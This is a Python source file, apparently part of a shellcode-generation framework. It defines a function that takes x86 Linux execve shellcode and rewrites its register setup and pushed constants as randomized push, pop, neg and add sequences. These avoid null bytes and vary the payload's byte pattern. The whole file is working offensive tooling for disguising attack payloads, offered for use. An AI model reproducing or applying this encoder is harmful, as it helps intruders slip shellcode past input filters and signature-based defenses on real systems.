#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import binascii
import string
from core.compatible import version


def start(shellcode):
    chars = string.digits + string.ascii_letters
    shellcode = 'xor %edx,%edx\n' + shellcode.replace(
        'push   $0xb\npop    %eax\ncltd',
        '').replace('push   %ebx\nmov    %esp,%ecx',
                    'push   %ebx\nmov    %esp,%ecx' + '\n' +
                    'push   $0xb\npop    %eax\ncltd')
    t = True
    eax = str('0xb')
    while t:
        if version() is 2:
            eax_1 = binascii.b2a_hex(''.join(random.choice(chars)
                                             for i in range(1)))
        if version() is 3:
            eax_1 = (binascii.b2a_hex((''.join(random.choice(
                chars) for i in range(1))).encode('latin-1'))
            ).decode('latin-1')
        eax_1 = str('0') + str(eax_1[1])
        eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
        if eax > eax_1:
            if '00' not in str(eax_1) and '0' not in str(eax_2):
                t = False
    A = 0
    eax = 'push   $%s' % (str(eax))
    if '-' in eax_2:
        A = 1
        eax_2 = eax_2.replace('-', '')
        eax_add = 'push $0x%s\npop %%eax\nneg %%eax\nadd $0x%s,%%eax\n' % (
            eax_2, eax_1)
    if A is 0:
        eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\n' % (eax_2,
                                                                eax_1)
    shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',
                                  eax_add + '\ncltd\n')
    for line in shellcode.rsplit('\n'):
        if 'push' in line and '$0x' in line and ',' not in line and len(
                line) > 14:
            data = line.rsplit('push')[1].rsplit('$0x')[1]
            t = True
            while t:
                if version() is 2:
                    ebx_1 = binascii.b2a_hex(''.join(random.choice(chars)
                                                     for i in range(4)))
                if version() is 3:
                    ebx_1 = (binascii.b2a_hex((''.join(random.choice(
                        chars) for i in range(4))).encode('latin-1'))
                    ).decode('latin-1')
                ebx_2 = "%x" % (int(data, 16) - int(ebx_1, 16))

                if str('00') not in str(ebx_1) and str('00') not in str(
                        ebx_2) and '-' in ebx_2 and len(
                    ebx_2) >= 7 and len(
                    ebx_1) >= 7 and '-' not in ebx_1:
                    ebx_2 = ebx_2.replace('-', '')
                    command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nadd %%ebx,%%eax\npush %%eax\n' % (
                        str(ebx_1), str(ebx_2))
                    shellcode = shellcode.replace(line, command)
                    t = False
    return shellcode
